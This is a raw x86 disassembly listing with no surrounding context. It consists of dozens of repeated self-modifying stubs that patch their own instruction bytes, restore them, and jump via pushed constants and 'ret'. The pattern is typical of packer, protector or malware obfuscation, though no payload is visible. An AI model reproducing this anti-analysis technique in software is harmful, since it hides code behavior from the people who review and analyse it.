  40bf69:	87 05 72 bf 40 00    	xchg   %eax,0x40bf72
  40bf6f:	58                   	pop    %eax
  40bf70:	f3 90                	pause
  40bf72:	db 22                	(bad) (%edx)
  40bf74:	5d                   	pop    %ebp
  40bf75:	6b 00 50             	imul   $0x50,(%eax),%eax
  40bf78:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bf7c:	66 87 05 72 bf 40 00 	xchg   %ax,0x40bf72
  40bf83:	b8 1b 4a eb 6f       	mov    $0x6feb4a1b,%eax
  40bf88:	87 04 24             	xchg   %eax,(%esp)
  40bf8b:	c3                   	ret
  40bf8c:	8f 05 ba bf 40 00    	pop    0x40bfba
  40bf92:	50                   	push   %eax
  40bf93:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bf99:	8d 80 d3 b3 39 ff    	lea    -0xc64c2d(%eax),%eax
  40bf9f:	87 05 a8 bf 40 00    	xchg   %eax,0x40bfa8
  40bfa5:	58                   	pop    %eax
  40bfa6:	f3 90                	pause
  40bfa8:	06                   	push   %es
  40bfa9:	79 4a                	jns    0x40bff5
  40bfab:	4b                   	dec    %ebx
  40bfac:	ff 50 66             	call   *0x66(%eax)
  40bfaf:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40bfb4:	05 a8 bf 40 00       	add    $0x40bfa8,%eax
  40bfb9:	b8 30 82 5a 56       	mov    $0x565a8230,%eax
  40bfbe:	87 04 24             	xchg   %eax,(%esp)
  40bfc1:	c3                   	ret
  40bfc2:	8f 05 f0 bf 40 00    	pop    0x40bff0
  40bfc8:	50                   	push   %eax
  40bfc9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40bfcf:	8d 80 d3 83 39 ff    	lea    -0xc67c2d(%eax),%eax
  40bfd5:	87 05 de bf 40 00    	xchg   %eax,0x40bfde
  40bfdb:	58                   	pop    %eax
  40bfdc:	f3 90                	pause
  40bfde:	5b                   	pop    %ebx
  40bfdf:	ef                   	out    %eax,(%dx)
  40bfe0:	38 7c ff 50          	cmp    %bh,0x50(%edi,%edi,8)
  40bfe4:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40bfe8:	66 87 05 de bf 40 00 	xchg   %ax,0x40bfde
  40bfef:	b8 71 37 86 e4       	mov    $0xe4863771,%eax
  40bff4:	87 04 24             	xchg   %eax,(%esp)
  40bff7:	c3                   	ret
  40bff8:	8f 05 26 c0 40 00    	pop    0x40c026
  40bffe:	50                   	push   %eax
  40bfff:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c005:	8d 80 d3 4d 39 ff    	lea    -0xc6b22d(%eax),%eax
  40c00b:	87 05 14 c0 40 00    	xchg   %eax,0x40c014
  40c011:	58                   	pop    %eax
  40c012:	f3 90                	pause
  40c014:	2b b1 10 95 ff 50    	sub    0x50ff9510(%ecx),%esi
  40c01a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c01e:	66 87 05 14 c0 40 00 	xchg   %ax,0x40c014
  40c025:	b8 ed bb c3 c2       	mov    $0xc2c3bbed,%eax
  40c02a:	87 04 24             	xchg   %eax,(%esp)
  40c02d:	c3                   	ret
  40c02e:	8f 05 5e c0 40 00    	pop    0x40c05e
  40c034:	50                   	push   %eax
  40c035:	90                   	nop
  40c036:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c03b:	8d 80 b2 25 30 00    	lea    0x3025b2(%eax),%eax
  40c041:	87 05 4a c0 40 00    	xchg   %eax,0x40c04a
  40c047:	58                   	pop    %eax
  40c048:	f3 90                	pause
  40c04a:	94                   	xchg   %eax,%esp
  40c04b:	f4                   	hlt
  40c04c:	1c fe                	sbb    $0xfe,%al
  40c04e:	40                   	inc    %eax
  40c04f:	40                   	inc    %eax
  40c050:	00 50 66             	add    %dl,0x66(%eax)
  40c053:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c058:	05 4a c0 40 00       	add    $0x40c04a,%eax
  40c05d:	b8 ee 42 db 85       	mov    $0x85db42ee,%eax
  40c062:	8d 40 02             	lea    0x2(%eax),%eax
  40c065:	87 04 24             	xchg   %eax,(%esp)
  40c068:	c3                   	ret
  40c069:	8f 05 97 c0 40 00    	pop    0x40c097
  40c06f:	50                   	push   %eax
  40c070:	90                   	nop
  40c071:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c076:	8d 80 aa e0 ff 3f    	lea    0x3fffe0aa(%eax),%eax
  40c07c:	87 05 85 c0 40 00    	xchg   %eax,0x40c085
  40c082:	58                   	pop    %eax
  40c083:	f3 90                	pause
  40c085:	12 79 a9             	adc    -0x57(%ecx),%bh
  40c088:	9d                   	popf
  40c089:	00 50 66             	add    %dl,0x66(%eax)
  40c08c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c091:	05 85 c0 40 00       	add    $0x40c085,%eax
  40c096:	b8 f6 49 8c c2       	mov    $0xc28c49f6,%eax
  40c09b:	87 04 24             	xchg   %eax,(%esp)
  40c09e:	c3                   	ret
  40c09f:	8f 05 ce c0 40 00    	pop    0x40c0ce
  40c0a5:	50                   	push   %eax
  40c0a6:	90                   	nop
  40c0a7:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c0ac:	8d 80 76 15 38 52    	lea    0x52381576(%eax),%eax
  40c0b2:	87 05 bb c0 40 00    	xchg   %eax,0x40c0bb
  40c0b8:	58                   	pop    %eax
  40c0b9:	f3 90                	pause
  40c0bb:	70 b3                	jo     0x40c070
  40c0bd:	87 e5                	xchg   %esp,%ebp
  40c0bf:	40                   	inc    %eax
  40c0c0:	00 50 66             	add    %dl,0x66(%eax)
  40c0c3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c0c8:	05 bb c0 40 00       	add    $0x40c0bb,%eax
  40c0cd:	b8 2b 72 39 c4       	mov    $0xc439722b,%eax
  40c0d2:	8d 40 01             	lea    0x1(%eax),%eax
  40c0d5:	87 04 24             	xchg   %eax,(%esp)
  40c0d8:	c3                   	ret
  40c0d9:	8f 05 08 c1 40 00    	pop    0x40c108
  40c0df:	50                   	push   %eax
  40c0e0:	90                   	nop
  40c0e1:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c0e6:	8d 80 ea f5 33 52    	lea    0x5233f5ea(%eax),%eax
  40c0ec:	87 05 f5 c0 40 00    	xchg   %eax,0x40c0f5
  40c0f2:	58                   	pop    %eax
  40c0f3:	f3 90                	pause
  40c0f5:	43                   	inc    %ebx
  40c0f6:	be 27 ce 40 00       	mov    $0x40ce27,%esi
  40c0fb:	50                   	push   %eax
  40c0fc:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c100:	66 87 05 f5 c0 40 00 	xchg   %ax,0x40c0f5
  40c107:	b8 85 70 70 9b       	mov    $0x9b707085,%eax
  40c10c:	8d 40 01             	lea    0x1(%eax),%eax
  40c10f:	87 04 24             	xchg   %eax,(%esp)
  40c112:	c3                   	ret
  40c113:	8f 05 41 c1 40 00    	pop    0x40c141
  40c119:	50                   	push   %eax
  40c11a:	90                   	nop
  40c11b:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c120:	8d 80 d3 20 29 ff    	lea    -0xd6df2d(%eax),%eax
  40c126:	87 05 2f c1 40 00    	xchg   %eax,0x40c12f
  40c12c:	58                   	pop    %eax
  40c12d:	f3 90                	pause
  40c12f:	7b b6                	jnp    0x40c0e7
  40c131:	5d                   	pop    %ebp
  40c132:	cf                   	iret
  40c133:	ff 50 66             	call   *0x66(%eax)
  40c136:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c13b:	05 2f c1 40 00       	add    $0x40c12f,%eax
  40c140:	b8 96 09 40 5b       	mov    $0x5b400996,%eax
  40c145:	87 04 24             	xchg   %eax,(%esp)
  40c148:	c3                   	ret
  40c149:	8f 05 78 c1 40 00    	pop    0x40c178
  40c14f:	50                   	push   %eax
  40c150:	90                   	nop
  40c151:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c156:	8d 80 76 15 2c 52    	lea    0x522c1576(%eax),%eax
  40c15c:	87 05 65 c1 40 00    	xchg   %eax,0x40c165
  40c162:	58                   	pop    %eax
  40c163:	f3 90                	pause
  40c165:	8a bd 52 fb 40 00    	mov    0x40fb52(%ebp),%bh
  40c16b:	50                   	push   %eax
  40c16c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c170:	66 87 05 65 c1 40 00 	xchg   %ax,0x40c165
  40c177:	b8 f9 d0 b3 c5       	mov    $0xc5b3d0f9,%eax
  40c17c:	8d 40 01             	lea    0x1(%eax),%eax
  40c17f:	87 04 24             	xchg   %eax,(%esp)
  40c182:	c3                   	ret
  40c183:	8f 05 b2 c1 40 00    	pop    0x40c1b2
  40c189:	50                   	push   %eax
  40c18a:	90                   	nop
  40c18b:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c190:	8d 80 ea f5 2f 52    	lea    0x522ff5ea(%eax),%eax
  40c196:	87 05 9f c1 40 00    	xchg   %eax,0x40c19f
  40c19c:	58                   	pop    %eax
  40c19d:	f3 90                	pause
  40c19f:	a3 b7 01 c6 40       	mov    %eax,0x40c601b7
  40c1a4:	00 50 66             	add    %dl,0x66(%eax)
  40c1a7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c1ac:	05 9f c1 40 00       	add    $0x40c19f,%eax
  40c1b1:	b8 94 c6 ef 65       	mov    $0x65efc694,%eax
  40c1b6:	8d 40 01             	lea    0x1(%eax),%eax
  40c1b9:	87 04 24             	xchg   %eax,(%esp)
  40c1bc:	c3                   	ret
  40c1bd:	8f 05 ec c1 40 00    	pop    0x40c1ec
  40c1c3:	50                   	push   %eax
  40c1c4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c1ca:	8d 80 ea f5 0f 52    	lea    0x520ff5ea(%eax),%eax
  40c1d0:	87 05 d9 c1 40 00    	xchg   %eax,0x40c1d9
  40c1d6:	58                   	pop    %eax
  40c1d7:	f3 90                	pause
  40c1d9:	4d                   	dec    %ebp
  40c1da:	bb b3 34 40 00       	mov    $0x4034b3,%ebx
  40c1df:	50                   	push   %eax
  40c1e0:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c1e4:	66 87 05 d9 c1 40 00 	xchg   %ax,0x40c1d9
  40c1eb:	b8 18 07 84 5e       	mov    $0x5e840718,%eax
  40c1f0:	8d 40 01             	lea    0x1(%eax),%eax
  40c1f3:	87 04 24             	xchg   %eax,(%esp)
  40c1f6:	c3                   	ret
  40c1f7:	8f 05 27 c2 40 00    	pop    0x40c227
  40c1fd:	50                   	push   %eax
  40c1fe:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c204:	8d 80 b2 25 0c 01    	lea    0x10c25b2(%eax),%eax
  40c20a:	87 05 13 c2 40 00    	xchg   %eax,0x40c213
  40c210:	58                   	pop    %eax
  40c211:	f3 90                	pause
  40c213:	ba cd 22 e5 00       	mov    $0xe522cd,%edx
  40c218:	00 00                	add    %al,(%eax)
  40c21a:	50                   	push   %eax
  40c21b:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c21f:	66 87 05 13 c2 40 00 	xchg   %ax,0x40c213
  40c226:	b8 ef 70 2c ae       	mov    $0xae2c70ef,%eax
  40c22b:	8d 40 02             	lea    0x2(%eax),%eax
  40c22e:	87 04 24             	xchg   %eax,(%esp)
  40c231:	c3                   	ret
  40c232:	8f 05 61 c2 40 00    	pop    0x40c261
  40c238:	50                   	push   %eax
  40c239:	90                   	nop
  40c23a:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c23f:	8d 80 ea f5 33 52    	lea    0x5233f5ea(%eax),%eax
  40c245:	87 05 4e c2 40 00    	xchg   %eax,0x40c24e
  40c24b:	58                   	pop    %eax
  40c24c:	f3 90                	pause
  40c24e:	c0 bb f5 b6 40 00 50 	sarb   $0x50,0x40b6f5(%ebx)
  40c255:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c259:	66 87 05 4e c2 40 00 	xchg   %ax,0x40c24e
  40c260:	b8 7d 27 88 3e       	mov    $0x3e88277d,%eax
  40c265:	8d 40 01             	lea    0x1(%eax),%eax
  40c268:	87 04 24             	xchg   %eax,(%esp)
  40c26b:	c3                   	ret
  40c26c:	8f 05 9a c2 40 00    	pop    0x40c29a
  40c272:	50                   	push   %eax
  40c273:	90                   	nop
  40c274:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c279:	8d 80 d3 c7 27 ff    	lea    -0xd8382d(%eax),%eax
  40c27f:	87 05 88 c2 40 00    	xchg   %eax,0x40c288
  40c285:	58                   	pop    %eax
  40c286:	f3 90                	pause
  40c288:	a2 ef e8 ce ff       	mov    %al,0xffcee8ef
  40c28d:	50                   	push   %eax
  40c28e:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c292:	66 87 05 88 c2 40 00 	xchg   %ax,0x40c288
  40c299:	b8 a8 d6 07 b3       	mov    $0xb307d6a8,%eax
  40c29e:	87 04 24             	xchg   %eax,(%esp)
  40c2a1:	c3                   	ret
  40c2a2:	8f 05 d2 c2 40 00    	pop    0x40c2d2
  40c2a8:	50                   	push   %eax
  40c2a9:	90                   	nop
  40c2aa:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c2af:	8d 80 b2 25 0c 01    	lea    0x10c25b2(%eax),%eax
  40c2b5:	87 05 be c2 40 00    	xchg   %eax,0x40c2be
  40c2bb:	58                   	pop    %eax
  40c2bc:	f3 90                	pause
  40c2be:	d5 43                	aad    $0x43
  40c2c0:	b3 68                	mov    $0x68,%bl
  40c2c2:	00 00                	add    %al,(%eax)
  40c2c4:	00 50 66             	add    %dl,0x66(%eax)
  40c2c7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c2cc:	05 be c2 40 00       	add    $0x40c2be,%eax
  40c2d1:	b8 35 60 70 bb       	mov    $0xbb706035,%eax
  40c2d6:	8d 40 02             	lea    0x2(%eax),%eax
  40c2d9:	87 04 24             	xchg   %eax,(%esp)
  40c2dc:	c3                   	ret
  40c2dd:	8f 05 0c c3 40 00    	pop    0x40c30c
  40c2e3:	50                   	push   %eax
  40c2e4:	90                   	nop
  40c2e5:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c2ea:	8d 80 ea f5 33 52    	lea    0x5233f5ea(%eax),%eax
  40c2f0:	87 05 f9 c2 40 00    	xchg   %eax,0x40c2f9
  40c2f6:	58                   	pop    %eax
  40c2f7:	f3 90                	pause
  40c2f9:	b9 41 90 e3 40       	mov    $0x40e39041,%ecx
  40c2fe:	00 50 66             	add    %dl,0x66(%eax)
  40c301:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c306:	05 f9 c2 40 00       	add    $0x40c2f9,%eax
  40c30b:	b8 d4 b1 ba b3       	mov    $0xb3bab1d4,%eax
  40c310:	8d 40 01             	lea    0x1(%eax),%eax
  40c313:	87 04 24             	xchg   %eax,(%esp)
  40c316:	c3                   	ret
  40c317:	8f 05 45 c3 40 00    	pop    0x40c345
  40c31d:	50                   	push   %eax
  40c31e:	90                   	nop
  40c31f:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c324:	8d 80 d3 1c 27 ff    	lea    -0xd8e32d(%eax),%eax
  40c32a:	87 05 33 c3 40 00    	xchg   %eax,0x40c333
  40c330:	58                   	pop    %eax
  40c331:	f3 90                	pause
  40c333:	e3 45                	jecxz  0x40c37a
  40c335:	2e 7c ff             	jl,pn  0x40c337
  40c338:	50                   	push   %eax
  40c339:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c33d:	66 87 05 33 c3 40 00 	xchg   %ax,0x40c333
  40c344:	b8 4b d9 d3 23       	mov    $0x23d3d94b,%eax
  40c349:	87 04 24             	xchg   %eax,(%esp)
  40c34c:	c3                   	ret
  40c34d:	8f 05 7d c3 40 00    	pop    0x40c37d
  40c353:	50                   	push   %eax
  40c354:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c35a:	8d 80 b2 25 0c 01    	lea    0x10c25b2(%eax),%eax
  40c360:	87 05 69 c3 40 00    	xchg   %eax,0x40c369
  40c366:	58                   	pop    %eax
  40c367:	f3 90                	pause
  40c369:	ac                   	lods   %ds:(%esi),%al
  40c36a:	be d8 86 00 00       	mov    $0x86d8,%esi
  40c36f:	00 50 66             	add    %dl,0x66(%eax)
  40c372:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c377:	05 69 c3 40 00       	add    $0x40c369,%eax
  40c37c:	b8 00 67 a9 6f       	mov    $0x6fa96700,%eax
  40c381:	8d 40 02             	lea    0x2(%eax),%eax
  40c384:	87 04 24             	xchg   %eax,(%esp)
  40c387:	c3                   	ret
  40c388:	8f 05 b8 c3 40 00    	pop    0x40c3b8
  40c38e:	50                   	push   %eax
  40c38f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c395:	8d 80 b2 25 c8 00    	lea    0xc825b2(%eax),%eax
  40c39b:	87 05 a4 c3 40 00    	xchg   %eax,0x40c3a4
  40c3a1:	58                   	pop    %eax
  40c3a2:	f3 90                	pause
  40c3a4:	16                   	push   %ss
  40c3a5:	75 d1                	jne    0x40c378
  40c3a7:	43                   	inc    %ebx
  40c3a8:	01 00                	add    %eax,(%eax)
  40c3aa:	00 50 66             	add    %dl,0x66(%eax)
  40c3ad:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c3b2:	05 a4 c3 40 00       	add    $0x40c3a4,%eax
  40c3b7:	b8 4e 93 e4 85       	mov    $0x85e4934e,%eax
  40c3bc:	8d 40 02             	lea    0x2(%eax),%eax
  40c3bf:	87 04 24             	xchg   %eax,(%esp)
  40c3c2:	c3                   	ret
  40c3c3:	8f 05 f3 c3 40 00    	pop    0x40c3f3
  40c3c9:	50                   	push   %eax
  40c3ca:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c3d0:	8d 80 b2 25 20 28    	lea    0x282025b2(%eax),%eax
  40c3d6:	87 05 df c3 40 00    	xchg   %eax,0x40c3df
  40c3dc:	58                   	pop    %eax
  40c3dd:	f3 90                	pause
  40c3df:	f2 c9                	repnz leave
  40c3e1:	bf dd 00 00 00       	mov    $0xdd,%edi
  40c3e6:	50                   	push   %eax
  40c3e7:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c3eb:	66 87 05 df c3 40 00 	xchg   %ax,0x40c3df
  40c3f2:	b8 98 a1 98 ed       	mov    $0xed98a198,%eax
  40c3f7:	8d 40 02             	lea    0x2(%eax),%eax
  40c3fa:	87 04 24             	xchg   %eax,(%esp)
  40c3fd:	c3                   	ret
  40c3fe:	8f 05 2f c4 40 00    	pop    0x40c42f
  40c404:	50                   	push   %eax
  40c405:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c40b:	8d 80 b2 24 e4 3f    	lea    0x3fe424b2(%eax),%eax
  40c411:	87 05 1a c4 40 00    	xchg   %eax,0x40c41a
  40c417:	58                   	pop    %eax
  40c418:	f3 90                	pause
  40c41a:	a2 d8 d8 df 01       	mov    %al,0x1dfd8d8
  40c41f:	00 00                	add    %al,(%eax)
  40c421:	00 50 66             	add    %dl,0x66(%eax)
  40c424:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c429:	05 1a c4 40 00       	add    $0x40c41a,%eax
  40c42e:	b8 2a 59 c7 79       	mov    $0x79c7592a,%eax
  40c433:	8d 40 03             	lea    0x3(%eax),%eax
  40c436:	87 04 24             	xchg   %eax,(%esp)
  40c439:	c3                   	ret
  40c43a:	8f 05 6b c4 40 00    	pop    0x40c46b
  40c440:	50                   	push   %eax
  40c441:	90                   	nop
  40c442:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c447:	8d 80 b2 24 e4 13    	lea    0x13e424b2(%eax),%eax
  40c44d:	87 05 56 c4 40 00    	xchg   %eax,0x40c456
  40c453:	58                   	pop    %eax
  40c454:	f3 90                	pause
  40c456:	f7 b4 ac 2d 01 00 00 	divl   0x12d(%esp,%ebp,4)
  40c45d:	00 50 66             	add    %dl,0x66(%eax)
  40c460:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c465:	05 56 c4 40 00       	add    $0x40c456,%eax
  40c46a:	b8 3a 4e 78 b6       	mov    $0xb6784e3a,%eax
  40c46f:	8d 40 03             	lea    0x3(%eax),%eax
  40c472:	87 04 24             	xchg   %eax,(%esp)
  40c475:	c3                   	ret
  40c476:	8f 05 a4 c4 40 00    	pop    0x40c4a4
  40c47c:	50                   	push   %eax
  40c47d:	90                   	nop
  40c47e:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c483:	8d 80 53 e0 bf ff    	lea    -0x401fad(%eax),%eax
  40c489:	87 05 92 c4 40 00    	xchg   %eax,0x40c492
  40c48f:	58                   	pop    %eax
  40c490:	f3 90                	pause
  40c492:	39 a4 22 d9 00 50 66 	cmp    %esp,0x665000d9(%edx,%eiz,1)
  40c499:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c49e:	05 92 c4 40 00       	add    $0x40c492,%eax
  40c4a3:	b8 c5 ed 3b 6c       	mov    $0x6c3bedc5,%eax
  40c4a8:	87 04 24             	xchg   %eax,(%esp)
  40c4ab:	c3                   	ret
  40c4ac:	8f 05 da c4 40 00    	pop    0x40c4da
  40c4b2:	50                   	push   %eax
  40c4b3:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c4b9:	8d 80 d3 f2 0b ff    	lea    -0xf40d2d(%eax),%eax
  40c4bf:	87 05 c8 c4 40 00    	xchg   %eax,0x40c4c8
  40c4c5:	58                   	pop    %eax
  40c4c6:	f3 90                	pause
  40c4c8:	6a 35                	push   $0x35
  40c4ca:	7b 2a                	jnp    0x40c4f6
  40c4cc:	ff 50 66             	call   *0x66(%eax)
  40c4cf:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c4d4:	05 c8 c4 40 00       	add    $0x40c4c8,%eax
  40c4d9:	b8 d3 78 fc 82       	mov    $0x82fc78d3,%eax
  40c4de:	87 04 24             	xchg   %eax,(%esp)
  40c4e1:	c3                   	ret
  40c4e2:	8f 05 10 c5 40 00    	pop    0x40c510
  40c4e8:	50                   	push   %eax
  40c4e9:	90                   	nop
  40c4ea:	b8 15 20 40 00       	mov    $0x402015,%eax
  40c4ef:	8d 80 d3 ad 1c ff    	lea    -0xe3522d(%eax),%eax
  40c4f5:	87 05 fe c4 40 00    	xchg   %eax,0x40c4fe
  40c4fb:	58                   	pop    %eax
  40c4fc:	f3 90                	pause
  40c4fe:	ef                   	out    %eax,(%dx)
  40c4ff:	09 69 6c             	or     %ebp,0x6c(%ecx)
  40c502:	ff 50 66             	call   *0x66(%eax)
  40c505:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c50a:	05 fe c4 40 00       	add    $0x40c4fe,%eax
  40c50f:	b8 2d cb 6d 46       	mov    $0x466dcb2d,%eax
  40c514:	87 04 24             	xchg   %eax,(%esp)
  40c517:	c3                   	ret
  40c518:	8f 05 46 c5 40 00    	pop    0x40c546
  40c51e:	50                   	push   %eax
  40c51f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c525:	8d 80 d3 e7 1d ff    	lea    -0xe2182d(%eax),%eax
  40c52b:	87 05 34 c5 40 00    	xchg   %eax,0x40c534
  40c531:	58                   	pop    %eax
  40c532:	f3 90                	pause
  40c534:	7d 1a                	jge    0x40c550
  40c536:	95                   	xchg   %eax,%ebp
  40c537:	1e                   	push   %ds
  40c538:	ff 50 66             	call   *0x66(%eax)
  40c53b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c540:	05 34 c5 40 00       	add    $0x40c534,%eax
  40c545:	b8 5c 82 0b 6e       	mov    $0x6e0b825c,%eax
  40c54a:	87 04 24             	xchg   %eax,(%esp)
  40c54d:	c3                   	ret
  40c54e:	8f 05 7c c5 40 00    	pop    0x40c57c
  40c554:	50                   	push   %eax
  40c555:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c55b:	8d 80 8c 5c 17 40    	lea    0x40175c8c(%eax),%eax
  40c561:	87 05 6a c5 40 00    	xchg   %eax,0x40c56a
  40c567:	58                   	pop    %eax
  40c568:	f3 90                	pause
  40c56a:	8c 87 de 71 00 50    	mov    %es,0x500071de(%edi)
  40c570:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c574:	66 87 05 6a c5 40 00 	xchg   %ax,0x40c56a
  40c57b:	b8 9a eb c7 38       	mov    $0x38c7eb9a,%eax
  40c580:	87 04 24             	xchg   %eax,(%esp)
  40c583:	c3                   	ret
  40c584:	8f 05 b2 c5 40 00    	pop    0x40c5b2
  40c58a:	50                   	push   %eax
  40c58b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c591:	8d 80 d3 e0 2e ff    	lea    -0xd11f2d(%eax),%eax
  40c597:	87 05 a0 c5 40 00    	xchg   %eax,0x40c5a0
  40c59d:	58                   	pop    %eax
  40c59e:	f3 90                	pause
  40c5a0:	45                   	inc    %ebp
  40c5a1:	43                   	inc    %ebx
  40c5a2:	78 c0                	js     0x40c564
  40c5a4:	ff 50 66             	call   *0x66(%eax)
  40c5a7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c5ac:	05 a0 c5 40 00       	add    $0x40c5a0,%eax
  40c5b1:	b8 a0 4e c2 61       	mov    $0x61c24ea0,%eax
  40c5b6:	87 04 24             	xchg   %eax,(%esp)
  40c5b9:	c3                   	ret
  40c5ba:	8f 05 e8 c5 40 00    	pop    0x40c5e8
  40c5c0:	50                   	push   %eax
  40c5c1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c5c7:	8d 80 d3 00 2f ff    	lea    -0xd0ff2d(%eax),%eax
  40c5cd:	87 05 d6 c5 40 00    	xchg   %eax,0x40c5d6
  40c5d3:	58                   	pop    %eax
  40c5d4:	f3 90                	pause
  40c5d6:	e5 6e                	in     $0x6e,%eax
  40c5d8:	56                   	push   %esi
  40c5d9:	8b ff                	mov    %edi,%edi
  40c5db:	50                   	push   %eax
  40c5dc:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c5e0:	66 87 05 d6 c5 40 00 	xchg   %ax,0x40c5d6
  40c5e7:	b8 e4 35 7a 71       	mov    $0x717a35e4,%eax
  40c5ec:	87 04 24             	xchg   %eax,(%esp)
  40c5ef:	c3                   	ret
  40c5f0:	8f 05 1e c6 40 00    	pop    0x40c61e
  40c5f6:	50                   	push   %eax
  40c5f7:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c5fd:	8d 80 d3 ee 2e ff    	lea    -0xd1112d(%eax),%eax
  40c603:	87 05 0c c6 40 00    	xchg   %eax,0x40c60c
  40c609:	58                   	pop    %eax
  40c60a:	f3 90                	pause
  40c60c:	bc 73 f7 a3 ff       	mov    $0xffa3f773,%esp
  40c611:	50                   	push   %eax
  40c612:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c616:	66 87 05 0c c6 40 00 	xchg   %ax,0x40c60c
  40c61d:	b8 12 ad 53 2a       	mov    $0x2a53ad12,%eax
  40c622:	87 04 24             	xchg   %eax,(%esp)
  40c625:	c3                   	ret
  40c626:	8f 05 55 c6 40 00    	pop    0x40c655
  40c62c:	50                   	push   %eax
  40c62d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c633:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  40c639:	87 05 42 c6 40 00    	xchg   %eax,0x40c642
  40c63f:	58                   	pop    %eax
  40c640:	f3 90                	pause
  40c642:	02 5c d1 17          	add    0x17(%ecx,%edx,8),%bl
  40c646:	40                   	inc    %eax
  40c647:	00 50 66             	add    %dl,0x66(%eax)
  40c64a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c64f:	05 42 c6 40 00       	add    $0x40c642,%eax
  40c654:	b8 33 a9 08 db       	mov    $0xdb08a933,%eax
  40c659:	8d 40 01             	lea    0x1(%eax),%eax
  40c65c:	87 04 24             	xchg   %eax,(%esp)
  40c65f:	c3                   	ret
  40c660:	8f 05 8e c6 40 00    	pop    0x40c68e
  40c666:	50                   	push   %eax
  40c667:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c66d:	8d 80 d3 81 19 ff    	lea    -0xe67e2d(%eax),%eax
  40c673:	87 05 7c c6 40 00    	xchg   %eax,0x40c67c
  40c679:	58                   	pop    %eax
  40c67a:	f3 90                	pause
  40c67c:	17                   	pop    %ss
  40c67d:	57                   	push   %edi
  40c67e:	d9 fd                	fscale
  40c680:	ff 50 66             	call   *0x66(%eax)
  40c683:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40c688:	05 7c c6 40 00       	add    $0x40c67c,%eax
  40c68d:	b8 e2 03 74 12       	mov    $0x127403e2,%eax
  40c692:	87 04 24             	xchg   %eax,(%esp)
  40c695:	c3                   	ret
  40c696:	8f 05 c5 c6 40 00    	pop    0x40c6c5
  40c69c:	50                   	push   %eax
  40c69d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40c6a3:	8d 80 ea 05 f4 51    	lea    0x51f405ea(%eax),%eax
  40c6a9:	87 05 b2 c6 40 00    	xchg   %eax,0x40c6b2
  40c6af:	58                   	pop    %eax
  40c6b0:	f3 90                	pause
  40c6b2:	8b 30                	mov    (%eax),%esi
  40c6b4:	b8 2b 40 00 50       	mov    $0x5000402b,%eax
  40c6b9:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40c6bd:	66 87 05 b2 c6 40 00 	xchg   %ax,0x40c6b2
  40c6c4:	b8 83 36 97 74       	mov    $0x74973683,%eax
  40c6c9:	8d 40 01             	lea    0x1(%eax),%eax
  40c6cc:	87 04 24             	xchg   %eax,(%esp)
  40c6cf:	c3                   	ret
  40c6d0:	8f 05 fe c6 40 00    	pop    0x40c6fe
  40c6d6:	50                   	push   %eax
  40c6d7:	8b 05 06 71 40 00    	mov    0x407106,%eax
